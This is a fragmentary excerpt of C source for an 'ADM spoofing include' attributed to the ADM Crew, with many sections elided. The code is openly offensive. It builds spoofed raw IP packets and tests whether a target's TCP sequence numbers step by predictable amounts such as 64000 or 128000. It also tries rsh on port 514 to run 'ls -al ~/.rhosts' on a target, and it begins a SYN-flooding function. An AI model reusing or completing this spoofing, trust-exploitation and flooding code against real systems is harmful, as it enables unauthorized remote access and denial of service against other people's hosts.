/************************************************************************/
/*  ADM spoofing include  ver 1.4.11                                    */
/************************************************************************/
/************************************************************************/
/*                         The  ADM Crew                                */
/************************************************************************/
...
void 
send_ip (int s, u_long s_addr, u_long d_addr,
	 u_char ttl, int proto,
	 char *data, int size)
{
  ...
  ip->id = random () % 5985;
  ip->protocol = proto;
  ip->tot_len = htons (IPHDRSIZE + size);
  ip->check = 0;
  ...
  memcpy ((packet + IPHDRSIZE), data, size);

  if ((sendto (s, packet, IPHDRSIZE + size, 0,
...
int 
lagometer (unsigned long int src, unsigned long int dest, int MaxTime, int MaxTry)
{
  struct iphdr *ip, *ipr;
  struct icmphdr *icmp, *icmpr;
  unsigned char *icmpdata;
  unsigned char *packet;
  unsigned char rcpt[512];
  ...
  while (1)
    {
      ipr = (struct iphdr *) rcpt;
      icmpr = (struct icmphdr *) (rcpt + IPHDRSIZE);

      ip = (struct iphdr *) packet;
      icmp = (struct icmphdr *) (packet + IPHDRSIZE);
      icmpdata = (char *) (packet + IPHDRSIZE + ICMPHDRSIZE);

      bzero (packet, (IPHDRSIZE + ICMPHDRSIZE + datasize + 1));
	...
	puts ("sendto error");
      ...
      if (try < MaxTry)
	for (maxwait = 1; maxwait < MaxTime; maxwait++)
	  {
	    sleep (1);
	    if (read (s_r, rcpt, sizeof (rcpt)) == -1)
	      continue;
	    else
	      {
		if (ipr->saddr == dest)
...
Stest (unsigned long myhost, unsigned long ip_d, unsigned short d_port)
{
  ...
  if (resu1 - resu == 64000 || resu1 - resu == 128000)
    done = 0;

  if (resu3 - resu2 == 64000 || resu3 - resu2 == 128000)
    done = 0;
...
/* socket stuff */
  ...
  while (((time (NULL) - TIMEOUTA) < timez))
    {
	...
	if (*(ptr + try) != 0)
      ...
      if (get_pkt (s_r, datar, sizeof (datar)) != -1)
	if (ipr->saddr == da_ip)
	  if (ntohs (tcpr->th_dport) > 39000)
	    {
	      ...
	      if (resu == 18)
		{
		  *(outptr + ((40000 + con) - ntohs (tcpr->th_dport))) = ntohs (tcpr->th_sport);
...
Rtest (u_long ip, int port, char *Ruser, char *Luser)
{
  ...
  if (port == 514)
      ...
      while (1)
	{
      ...
      printf ("we trying to execute a - ls  -al ~/.rhosts - on %s\n", inet_ntoa (ip));
...
void 
ADMsyn (u_long d_ip, u_int port, int num)
{
  int i = 1, s;
  u_int s_ip;
